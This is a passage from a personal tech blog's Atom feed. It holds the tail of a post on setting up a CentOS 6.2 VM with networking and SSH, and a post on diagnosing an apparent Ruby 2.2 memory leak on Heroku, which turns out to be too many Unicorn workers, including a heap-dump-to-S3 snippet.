The end goal of this post is to have a working OS which we can <code>ssh</code> into from the Mac hosting the VM.</p>

<p>Specifically I&rsquo;m doing this to be able to practice/learn/discover various pieces available in CentOS which
is the environment that I now work in at <a href="http://www.cisco.com/c/en/us/products/security/fireamp-private-cloud-virtual-appliance/index.html">Cisco</a>.
Also a hat tip to Mo Khan, whom I work with, his <a href="http://www.mokhan.ca/">blog</a> lead me to document as I go.</p>

<h2>Spinning Up the VM</h2>

<ul>
<li><a href="http://www.vmware.com/ca/en/products/fusion">Download &amp; Install VMWare Fusion</a></li>
<li>Download CentOS 6.2 Minimal ISO

<ul>
<li>Using the link: <a href="http://vault.centos.org/6.2/isos/x86_64/">http://vault.centos.org/6.2/isos/x86_64/</a> you&rsquo;ll be redirected to a mirror follow the
path: <code>6.2/ -&gt; isos/ -&gt; x86_64/ -&gt; CentOS-6.2-x86_64-minimal.iso</code></li>
</ul>
</li>
<li>Start up VMWare Fusion &amp; mount against ISO image

<ul>
<li><a href="http://www.chriscolotti.us/technology/how-to-get-started-with-centos-minimal/#comment-524732198">Do not use &ldquo;Easy Install&rdquo; it causes problems</a></li>
</ul>
</li>
<li>Go through the steps necessary to setup the OS</li>
</ul>


<h2>Network Configuration</h2>

<p>The minimal version of CentOS doesn&rsquo;t have the network setup, so if you ping google: <code>ping google.com</code>
it will fail. That means you&rsquo;ll have to configure your network setup. Once your machine has booted:</p>

<ul>
<li>Configure eth0 by running: <code>vi /etc/sysconfig/network-scripts/ifcfg-eth0</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEVICE="eth0"
</span><span class='line'>HWADDR="01:23:45:67:89:ab" # yours will be different
</span><span class='line'>NM_CONTROLLED="yes"
</span><span class='line'>
</span><span class='line'># Was originally no, change to yes
</span><span class='line'>ONBOOT="yes"
</span><span class='line'>
</span><span class='line'># New Info
</span><span class='line'>BOOTPROTO=dhcp
</span><span class='line'>IP=192.168.1.128 # you can modify as you'd like</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Restart the network interface: <code>/etc/init.d/network restart</code></li>
<li>Then <code>ping google.com</code> and <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/success.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="success">
              success
              </span>
            </span>
          </li>
</ul>


<h2>Setup SSH</h2>

<ul>
<li>Install the openssh packages with yum:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install openssh-server openssh-client -y</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Now you should be able to ssh into the box locally:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@127.0.0.1</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Run <code>ifconfig | grep "inet "</code> and pull the ip address that isn&rsquo;t <code>127.0.0.1</code>. It will be the same as
the eth0 config from above (<code>192.168.1.128</code>). Then <strong>on your mac (not linux terminal)</strong> ssh into the vm:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@129.168.1.128</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Debugging Memory Leaks on Heroku]]></title>
    <link href="http://gavinmiller.io/2015/debugging-memory-leaks-on-heroku/">
    <updated>2015-06-04T07:35:00-06:00</updated>
    <id>http://gavinmiller.io/2015/debugging-memory-leaks-on-heroku</id>
    <content type="html"><![CDATA[<p><aside>
This post was originally published on the <a href="http://nerds.petrofeed.com/post/118802589089/debugging-memory-leaks-on-heroku">PetroFeed Engeineering blog</a>.
</aside></p>

<p>Recently at PetroFeed we upgraded from Ruby 1.9 to 2.2. It was a great upgrade for us. Some of our expensive
requests dropped from 4 seconds to 1 second, and we saw a drastic reduction in the time spent doing Garbage
Collection which has reduced our request times on average as well.</p>

<p>However our situation wasn&rsquo;t all roses! We started to see memory impacts on Heroku. You can see in the image
below a HUGE spike in our memory usage up to 1GB.</p>

<p><img src="http://gavinmiller.io/images/heroku_performance/heroku-graph.png" alt="A heroku graph demonstrating a large spike in memory" /></p>

<p>And because we are running 2x dynos on Heroku our max memory is 1GB. It got to the point where our server
was locking up and requiring a restart to resolve the issue. We were slightly nervous to put things mildly.</p>

<p><img src="http://gavinmiller.io/images/heroku_performance/beaker.gif" alt="Beaker from the mupets quivering in fear" /></p>

<p>Our suspicion was that the area of our app that dropped from 4s/req to 1s/req since it is a very memory intensive
area of our application. My teammate <a href="https://twitter.com/fgrehm">Fabio</a> was able to craft a request that we could
repeatedly run to drive up the memory and hit our limits. It looked like we had a memory leak!</p>

<p>Now I&rsquo;m a huge fan of Sam Saffron and all of the amazing work he&rsquo;s done in the Ruby community around performance.
Specifically his work around <a href="http://samsaffron.com/archive/2015/03/31/debugging-memory-leaks-in-ruby">debugging memory leaks in Ruby</a>.
For me the opportunity to try out some new debugging techniques on a real problem was really exciting.</p>

<p>My first crack at the problem had me trying to replicate Sam&rsquo;s heap dumping technique locally against our
suspected leak. I used a <a href="https://github.com/fgrehm/boom-curl">tool that Fabio created called boom-curl</a> to
hammer my local web server with requests. I would then do a heap dump and run some analysis against the dump.
What was really confusing was that there was no obvious memory leak. Everything appeared to be GC&rsquo;d correctly.</p>

<p><img src="http://gavinmiller.io/images/heroku_performance/frown.png" alt="A frown emoticon" /></p>

<p>Not to give away the ending, but this should have been a signal that I ought to have taken notice of. Instead
the conclusion I made was &mdash; well maybe this problem is on Heroku only!</p>

<h2>Getting a Memory Dump from Heroku</h2>

<p>One difference between PetroFeed and Discourse (the product Sam works on) is that PetroFeed runs on Heroku
and Discourse does not. This presents some unique challenges when trying to dump memory.</p>

<p>One of those challenges is that Heroku will timeout a request that runs longer than 30 seconds. When doing
a full heap dump, I was regularly hitting this timeout! To try and work around that timeout I ran through
the following iterations:</p>

<ol>
<li>Do a direct text dump out of rails with <code>render text: dump</code></li>
<li>Dump into postgres</li>
<li>Dump into redis and download in a separate request</li>
<li>Dump to a file in /tmp and download it from /tmp</li>
<li>Dump to a file in /tmp and upload to S3 from a delayed job</li>
</ol>


<p>Each of those steps failed for a variety of reasons:</p>

<ul>
<li>Took too much time to respond with 100MB+ of payload</li>
<li>Took too long to insert into postgres</li>
<li>Accessing /tmp from a dyno that didn&rsquo;t write the file (Heroku&rsquo;s ephemeral storage)</li>
<li>Truncation occurring when writing into Redis (this might not have been the problem, but appeared to be at the time)</li>
</ul>


<p>Eventually I was able to get a successful dump out of Heroku without getting a timeout. To do that I wrote
to a file in <code>/tmp</code> then did a direct upload to S3. My hypothesis is that because Heroku runs on AWS I was
getting faster uploads to S3 which is why this was successful. And since there&rsquo;s no code in the wild on how
to do that, here&rsquo;s how I did it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">dump_memory</span>
</span><span class='line'>  <span class="no">GC</span><span class="o">.</span><span class="n">start</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">time</span> <span class="o">=</span> <span class="no">DateTime</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%-l%M&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">path</span> <span class="o">=</span> <span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;tmp/ruby-heap.</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">.dump&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">io</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="no">ObjectSpace</span><span class="o">.</span><span class="n">dump_all</span><span class="p">(</span><span class="ss">output</span><span class="p">:</span> <span class="n">io</span><span class="p">)</span>
</span><span class='line'>  <span class="n">io</span><span class="o">.</span><span class="n">close</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">bucket</span> <span class="o">=</span> <span class="vg">$s3</span><span class="o">.</span><span class="n">buckets</span><span class="o">[</span><span class="s1">&#39;mah-bucket&#39;</span><span class="o">]</span>
</span><span class='line'>  <span class="n">obj</span> <span class="o">=</span> <span class="n">bucket</span><span class="o">.</span><span class="n">objects</span><span class="o">[</span><span class="n">time</span><span class="o">]</span>
</span><span class='line'>  <span class="n">obj</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="no">IO</span><span class="o">.</span><span class="n">binread</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">render</span> <span class="ss">text</span><span class="p">:</span> <span class="s2">&quot;success - </span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>A couple points of note:</p>

<ul>
<li>I left out <code>ObjectSpace.trace_object_allocations_start</code> I set that up in an initializer.</li>
<li>I tried doing an <code>IO.pipe</code> instead of writing to a file but couldn&rsquo;t get that to work.</li>
<li>I did use <code>IO.binread</code> which worked better than <code>File.read</code></li>
<li>It seems weird to me that I needed to dump a file, then read a file, then write again. I&rsquo;m sure there&rsquo;s a
better way to just write straight to S3 but I couldn&rsquo;t find it! Toss me a message if you figure out a
better way and I&rsquo;ll amend the post!</li>
</ul>


<h2>Dump Analysis</h2>

<p>Now that I was able to get a dump out of Heroku it was time to start analyzing the dump. I&rsquo;ll skip that long
boring process, but eventually I got to the point where I started to question whether we actually had a memory
leak. Basically every time I did the analysis there was nothing surfacing that looked like a memory leak in our
application.</p>

<p>At this point I circled back on my previous finding that there were no memory leaks occurring on my local
machine. I grabbed one of my team mates and explained the problem to him (which is great for triggering
questions against your assumptions!) We then went back to our dev environment and started to reduce the
number of variables to try and isolate anything else that might be affecting a dyno&rsquo;s memory.</p>

<p>We turned off New Relic, Increased to a PX dyno (which has 6GB of memory), and reduced the number of Unicorn
Workers from 3 to 1. And then something strange started to happen &hellip; our memory would spike (like we were
observing on production) and then plateau between 500MB &ndash; 600MB. Another dead obvious indicator that a leak
wasn&rsquo;t occurring! :P</p>

<p>After some reflection and thinking, I came to the following conclusion:</p>

<p>Each production dyno had 3 unicorn workers running, and each worker was consuming ~600MB of memory. Combining
that with a 2x dyno that maxes out at 1,000MB, it&rsquo;s easy to see that 3 * 600MB == 1,800MB would quickly exceed
the 2x dyno limit and we&rsquo;d see memory issues that looked like memory leaks.</p>

<p>Previously we were able to safely run 3 workers without exceeding the 2x dyno memory ceiling, but because Ruby
2.2 exchanges an increase in memory for a decrease in request times (performance increase) we hit the tipping point!</p>

<p><aside>
<strong>Update</strong>: After reaching out to a friend of mine at Heroku, he mentioned that the spike was pretty suspicious.
Obviously we&rsquo;ll continue to keep our eyes peeled for this leak, and if it pops up again, follow up.
</aside></p>
]]></content>
  </entry>
  
</feed>
